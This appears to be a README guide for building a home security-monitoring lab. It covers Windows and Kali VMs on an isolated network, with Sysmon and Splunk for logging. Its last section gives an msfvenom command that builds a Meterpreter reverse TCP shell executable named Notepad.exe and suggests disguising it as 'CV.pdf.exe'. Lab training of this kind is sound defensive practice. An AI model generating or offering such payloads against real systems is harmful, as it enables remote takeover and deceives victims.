# SOC Home Lab Guide

---
## Downloading VMWare | Windows 10/11 | Kali Linux VMs | Sysmon | Splunk Enterprise  
[VMware](https://www.techpowerup.com/download/vmware-workstation-pro/)  
[Windows 10](https://www.microsoft.com/en-gb/software-download/windows10)
[Windows 11](https://www.microsoft.com/en-gb/software-download/windows11)  
[Kali Linux](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-vmware-amd64.7z)  
[Sysmon](https://download.sysinternals.com/files/Sysmon.zip)  
[Sysmon Config](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml)  
[Splunk Enterprise](https://www.splunk.com/en_us/download/splunk-enterprise.html)  
[Sysmon PowerShell Script](https://github.com/Trn44/SOC-Home-Lab/raw/main/Sysmon.ps1)

---
## Installing VMs | Sysmon | Splunk Setup
- Download Windows ISO, Kali Linux VM  
Install Windows VM from created ISO file.  
Extract Kali Linux Zip and Import VM.  

- Copy & paste Splunk Enterprise Installer to Windows VM.  
Install Splunk Enterprise from MSI installer to VM.  

- Copy & paste Sysmon, Sysmon Config to VM.  
Unzip Sysmon folder, copy and paste sysmonconfig.xml into directory where Sysmon64.exe is located.  
Download provided PowerShell Script and copy, paste into Sysmon root folder to 1 click install Sysmon.

---
## Creating Closed Local Virtual Network Environment
- Open VMWare's Virtual Machine Settings for both Windows & Kali Linux.
- Select "Network Adapter", under "Network Connection" select "LAN Segment".
- Click the "LAN Segments..." Button below and add a new LAN with desired name.
- Select Newly created LAN network under the drop down menu on "LAN Segment:".

---
## Asigning IP Addresses
- On Windows 10/11:  
Right-click the globe in system tray, Open Network & Internet Settings  
Click Change adapter options  
Right click the network adapter, Properties  
Select Internet Protocol Version 4 (TCP/IPv4), Properties  
Select Use the following IP address  
Create an IP Address of your choosing, example: 192.168.0.100  
Click OK  
Open CMD/PowerShell, type ipconfig to verify IP.

- On Kali Linux:  
Click the Ethernet icon in top right  
Select Edit Connections, select the wired connection  
Double click the network adpater, go to IPv4 Settings   
Set Method to Manual  
Click Add under Addresses:  
Create an IP Address of your choosing, example: 192.168.0.200   
Netmask: 24  
Click Save  
Open terminal, type ifconfig to verify IP.

---
## Verify Network
- Windows:  
In CMD/PowerShell type ping 192.168.0.200 (Your selected IP for Kali).  
- Kali Linux:  
In terminal type ping 192.168.0.100 (Your selected IP for WIndows).

---
## Splunk Configuration
- Download provided inputs.conf  
Copy, paste inputs.conf into the Splunk directory for collecting sysmon logs "C:\Program Files\Splunk\etc\system\local".

---
## Generating Payload
- Using msfvenom on Kali Linux  
To list all avaliable payloads we can type "msfvenom -l payloads" into the terminal.  
The payload used in this SOC lab is "windows/x64/meterpreter_reverse_tcp".  
We will generate a reverse TCP shellcode from our Windows VM to Kali VM.  
In the Kali terminal we can use "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.0.200 lport=4444 -f exe -o Notepad.exe".  
LHOST = The IP address of your Kali VM, Notepad.exe is our generated filename which can be any name of your choosing eg CV.pdf.exe.  
